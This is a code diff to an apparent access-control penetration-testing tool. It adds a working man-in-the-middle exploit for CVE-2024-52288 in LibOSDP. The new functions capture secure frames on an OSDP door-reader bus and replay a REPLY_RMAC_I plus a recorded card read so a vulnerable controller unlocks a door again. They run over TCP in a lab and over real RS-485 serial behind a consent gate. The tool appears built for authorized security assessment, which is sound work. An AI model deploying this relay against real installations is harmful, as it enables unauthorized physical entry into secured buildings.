@@ -35,9 +35,9 @@ from collections.abc import Callable, Iterable, Sequence
 from pathlib import Path
 from typing import TYPE_CHECKING
 
-from interlock.osdp import codec, constants
+from interlock.osdp import codec, constants, framer
 from interlock.osdp.codec import OsdpFrame
-from interlock.osdp.transport import Direction, TCPTap
+from interlock.osdp.transport import Direction, TCPTap, Transform
 from interlock.plugin import Finding, Severity
 
 if TYPE_CHECKING:
@@ -62,6 +62,162 @@ Inject = Callable[[bytes], None]
 
 # A zero-arg oracle reporting whether the lock-state signal is CURRENTLY observed unlocked.
 LockStateProbe = Callable[[], bool]
+
+# --- ATK-05b: CVE-2024-52288 Secure Channel replay --------------------------------------
+
+# ATK-05b shares ATK-05a's AiTM/replay ATT&CK family (T1557 = _TECHNIQUE): the out-of-sequence
+# REPLY_RMAC_I is the CVE's secure-channel desync primitive, not a different technique.
+
+# Trigger file the live cve relay watches: injection arms only once this path exists, so the
+# matched-pair test observes a genuinely locked baseline before attributing any transition to the
+# replay (mirrors the cleartext ``_TRIGGER_PATH`` discipline). Both the fixed TCP relay and the
+# vuln inline fifo relay (lab/attacker/fifo_relay.py) key off it.
+_CVE_TRIGGER_PATH = Path("/tmp/interlock-cve-fire")
+
+
+def run_cve_replay(
+    recorded_secure_frames: Sequence[bytes],
+    inject: Inject,
+    lock_state_probe: LockStateProbe,
+    *,
+    technique: str = _TECHNIQUE,
+) -> list[Finding]:
+    """Replay recorded secure pd->cp frames to defeat the Secure Channel (CVE-2024-52288).
+
+    CVE-2024-52288 is a LibOSDP Secure Channel flaw fixed in 3.0.0: a Control Panel accepts a
+    ``REPLY_RMAC_I`` from the PD side at any time, copies the supplied r_mac straight into its
+    session state and calls ``sc_activate`` (src/osdp_cp.c), resetting the channel's MAC
+    freshness. Replaying the genuine handshake ``REPLY_RMAC_I`` therefore rewinds the CP's r_mac
+    to session start, after which a previously observed secure PD reply - the card read the
+    controller authorises a door-open on - is accepted again and the CP re-issues the unlock. This
+    is the pure verdict (D-02), the same callable-driven shape as ``run_replay`` / ``run_spoof``:
+
+    - ``recorded_secure_frames`` are the exact wire bytes of secure pd->cp frames observed
+      earlier - the handshake ``REPLY_RMAC_I`` (the desync primitive) and the secure card-read
+      reply to replay; an empty sequence injects nothing and returns ``[]`` (the flagged true
+      negative - nothing to replay).
+    - They are injected byte-for-byte, in order (raw bytes, no text/codepoint normalization).
+    - A locked baseline is required exactly like ``run_replay``: if ``lock_state_probe()`` already
+      reports the replay-attributable transition before injection, ``[]`` is returned. A ``HIGH``
+      Finding is emitted only on an observed post-injection transition; a fixed v3.0.8 CP rejects
+      the out-of-state ``REPLY_RMAC_I`` so no transition follows and ``[]`` is returned - the
+      matched-pair failure.
+    """
+    if not recorded_secure_frames:
+        return []
+    if lock_state_probe():
+        return []  # inconclusive: already unlocked, not attributable to this replay
+    for frame_bytes in recorded_secure_frames:
+        inject(frame_bytes)  # replay the recorded secure frames byte-for-byte, in order
+    if not lock_state_probe():
+        return []  # the CP rejected the out-of-state REPLY_RMAC_I: no transition (fixed profile)
+    return [
+        Finding(
+            id="ATK-05b-cve-2024-52288-rmac-replay",
+            title="OSDP Secure Channel defeated by a REPLY_RMAC_I replay (CVE-2024-52288)",
+            severity=Severity.HIGH,
+            evidence=(
+                "The controller authorised exactly one unlock on the genuine card read, then "
+                "authorised a SECOND unlock after the genuine handshake REPLY_RMAC_I (0x78) and "
+                "a secure PD card-read reply were replayed to it byte-for-byte - the vulnerable "
+                "libosdp core (v2.4.0, CVE-2024-52288) reset its r_mac on the replayed RMAC_I "
+                "(sc_activate) and re-authorised a door-open off a credential it never saw live, "
+                "where a fixed core (v3.0.8) rejects the out-of-state RMAC_I and authorises nothing."
+            ),
+            attack_technique=technique,
+            remediation=(
+                "Upgrade LibOSDP to 3.0.0 or later, which only accepts REPLY_RMAC_I during the "
+                "Secure Channel handshake and rejects it mid-session; CVE-2024-52288 lets an "
+                "in-path attacker rewind the controller's MAC state and replay captured Secure "
+                "Channel traffic against the vulnerable 2.x core."
+            ),
+        )
+    ]
+
+
+def cve_replay_transform(*, armed: Callable[[], bool] = lambda: True) -> Transform:
+    """Return a one-shot ``Transform`` that replays captured secure pd->cp frames toward the CP.
+
+    The write-capable (04-03) seam: every frame is forwarded unchanged (Secure Channel comes up
+    transparently) while the relay accumulates the genuine secure pd->cp frames it sees - the
+    handshake ``REPLY_RMAC_I`` and the secure card-read reply. Once ``armed()`` is True, right
+    after the next pd->cp frame it replays those captured frames in-band toward the CP: the
+    REPLY_RMAC_I rewinds the vulnerable CP's r_mac (``sc_activate``), so the replayed card read is
+    accepted and the CP re-issues the authorised unlock (the lock-state flips a second time). A
+    fixed v3.0.8 CP rejects the out-of-state REPLY_RMAC_I, so nothing is re-authorised. Buffers per
+    direction because a chunk is not guaranteed to be a whole frame (Pitfall 5), mirroring
+    ``unlock_transform``."""
+    buffers: dict[Direction, bytearray] = {
+        Direction.cp_to_pd: bytearray(),
+        Direction.pd_to_cp: bytearray(),
+    }
+    forwarded: dict[Direction, int] = {Direction.cp_to_pd: 0, Direction.pd_to_cp: 0}
+    captured: list[bytes] = []
+    injected = False
+
+    def transform(direction: Direction, data: bytes) -> bytes:
+        nonlocal injected
+        buffer = buffers[direction]
+        buffer.extend(data)
+        frames = list(framer.iter_frames(bytes(buffer)))
+        new_frames = frames[forwarded[direction] :]
+        forwarded[direction] = len(frames)
+
+        out = bytearray()
+        for raw in new_frames:
+            out += raw  # forward the genuine frame unchanged to keep the live session alive
+            if direction is not Direction.pd_to_cp:
+                continue
+            try:
+                frame = codec.decode(raw)
+            except codec.DecodeError:
+                continue
+            if frame.scb or frame.code == constants.REPLY_RMAC_I:
+                captured.append(raw)  # a genuine secure pd->cp frame, worth replaying
+            if not injected and armed() and captured:
+                out += b"".join(captured)  # replay REPLY_RMAC_I (desync) + the secure card read
+                injected = True
+        return bytes(out)
+
+    return transform
+
+
+def serve_cve_replay_lab(target_port: int, upstream: tuple[str, int]) -> None:
+    """Serve the inline CVE-2024-52288 replay relay against the fixed TCP lab bus (blocking).
+
+    Drives ``cve_replay_transform`` onto the write-capable ``TCPTap.serve_rewrite`` seam, armed
+    by the ``_CVE_TRIGGER_PATH`` trigger file so a test can observe a locked baseline first.
+    Blocks serving connections, like the other attack modules' lab drivers.
+    """
+    TCPTap(target_port, upstream).serve_rewrite(cve_replay_transform(armed=_CVE_TRIGGER_PATH.exists))
+
+
+def _serial_cve_relay(cp_endpoint: object, pd_endpoint: object) -> None:
+    """Run the CVE-2024-52288 replay over a two-segment real serial MITM (``--physical``).
+
+    The serial analogue of ``serve_cve_replay_lab``: an RS-485 OSDP bus is split into a CP-side
+    and a PD-side segment (the CP-side opened only after the SAFE-02 consent gate), and
+    ``cve_replay_transform`` is applied to each direction. Mirrors ``spoof._serial_unlock_relay``
+    so the module imports with no pyserial at module scope.
+    """
+    import threading
+
+    transform = cve_replay_transform()
+
+    def pump(src: object, dst: object, direction: Direction) -> None:
+        while True:
+            data = bytes(src.read(4096))  # type: ignore[attr-defined]
+            if not data:
+                continue
+            out = transform(direction, data)
+            if out:
+                dst.write(out)  # type: ignore[attr-defined]
+
+    worker = threading.Thread(
+        target=pump, args=(pd_endpoint, cp_endpoint, Direction.pd_to_cp), daemon=True
+    )
+    worker.start()
+    pump(cp_endpoint, pd_endpoint, Direction.cp_to_pd)
 
 
 def capture_card_exchange(frames: Iterable[tuple[Direction, OsdpFrame]]) -> list[bytes]:
@@ -150,14 +306,24 @@ def main() -> None:
     """Attacker-container entrypoint: serve the clear-text replay relay (lab default).
 
     Run by the ``docker-compose.replay.yml`` override as
-    ``python -m interlock.osdp.attacks.replay``. The injection only arms once
-    ``_TRIGGER_PATH`` exists (``docker compose exec ... touch``), so a live test can confirm
-    the PD stays locked beforehand and attribute the transition to an explicit ``inject()``
-    call. The CVE-2024-52288 path (``--mode cve``) is added by plan 04-08.
+    ``python -m interlock.osdp.attacks.replay``. The injection only arms once the mode's trigger
+    file exists (``docker compose exec ... touch``), so a live test can confirm the PD stays
+    locked beforehand and attribute the transition to an explicit ``inject()`` call. Set
+    ``ATTACK_MODE=cve`` (``docker-compose.cve.yml``) to serve the CVE-2024-52288 Secure Channel
+    replay relay instead of the clear-text one (ATK-05b).
     """
+    upstream = _upstream()
+    if os.environ.get("ATTACK_MODE", "cleartext") == "cve":
+        print(
+            f"interlock: replay (cve-2024-52288) MITM listening on 0.0.0.0:{_LAB_PORT} "
+            f"upstream={upstream[0]}:{upstream[1]}",
+            flush=True,
+        )
+        serve_cve_replay_lab(_LAB_PORT, upstream)
+        return
+
     from interlock.osdp.attacks.spoof import unlock_transform
 
-    upstream = _upstream()
     print(
         f"interlock: replay (cleartext) MITM listening on 0.0.0.0:{_LAB_PORT} "
         f"upstream={upstream[0]}:{upstream[1]}",
@@ -175,8 +341,8 @@ def register(app: typer.Typer) -> None:
         mode: str = typer.Option(
             "cleartext",
             "--mode",
-            help="cleartext = replay a captured card-presentation exchange (default). "
-            "The cve mode is added by a later plan.",
+            help="cleartext = replay a captured card-presentation exchange (default); "
+            "cve = replay secure frames behind an out-of-sequence REPLY_RMAC_I (CVE-2024-52288).",
         ),
         port: int = typer.Option(
             _DEFAULT_LISTEN_PORT,
@@ -215,16 +381,16 @@ def register(app: typer.Typer) -> None:
             help="Scope identifier you are authorized to assess (required for --physical).",
         ),
     ) -> None:
-        """Replay a captured clear-text card-presentation exchange via an in-path injection."""
-        if mode != "cleartext":
-            raise typer.BadParameter("--mode must be 'cleartext' (cve is added by a later plan)")
-
-        from interlock.osdp.attacks.spoof import _serial_unlock_relay
+        """Replay a captured clear-text exchange, or the CVE-2024-52288 Secure Channel replay."""
+        if mode not in ("cleartext", "cve"):
+            raise typer.BadParameter("--mode must be 'cleartext' or 'cve'")
 
         if physical:
-            # The ONLY real-port path: SAFE-02 consent gate before any byte is transmitted.
+            # The ONLY real-port path: SAFE-02 consent gate before any byte is transmitted. The
+            # CVE replay defaults to the lab; a real port is reached only through this gate.
             from interlock.osdp import transport
             from interlock.osdp.attacks import safety
+            from interlock.osdp.attacks.spoof import _serial_unlock_relay
 
             if not device or not upstream_device or not target:
                 raise typer.BadParameter(
@@ -234,15 +400,34 @@ def register(app: typer.Typer) -> None:
             try:
                 pd_endpoint = transport.open_serial_endpoint(upstream_device)
                 try:
-                    typer.echo(
-                        "Running clear-text replay over the consented serial segments "
-                        "(Ctrl-C to stop)."
-                    )
-                    _serial_unlock_relay(cp_endpoint, pd_endpoint)
+                    if mode == "cve":
+                        typer.echo(
+                            "Running the CVE-2024-52288 replay over the consented serial "
+                            "segments (Ctrl-C to stop)."
+                        )
+                        _serial_cve_relay(cp_endpoint, pd_endpoint)
+                    else:
+                        typer.echo(
+                            "Running clear-text replay over the consented serial segments "
+                            "(Ctrl-C to stop)."
+                        )
+                        _serial_unlock_relay(cp_endpoint, pd_endpoint)
                 finally:
                     pd_endpoint.close()
             finally:
                 cp_endpoint.close()
+            return
+
+        if mode == "cve":
+            # The CVE-2024-52288 replay is an inline MITM. Over TCP (the fixed v3.0.8 lab profile,
+            # and the user-facing tool path) it relays here; the vulnerable v2.4.0 fifo bus is
+            # driven by the lab's own inline relay entrypoint (lab/attacker/fifo_relay.py), since
+            # that bus exists only inside the lab image.
+            typer.echo(
+                f"Running the CVE-2024-52288 replay MITM on the lab bus: listening on :{port}, "
+                f"relaying to {upstream_host}:{upstream_port} (Ctrl-C to stop)."
+            )
+            serve_cve_replay_lab(port, (upstream_host, upstream_port))
             return
 
         typer.echo(
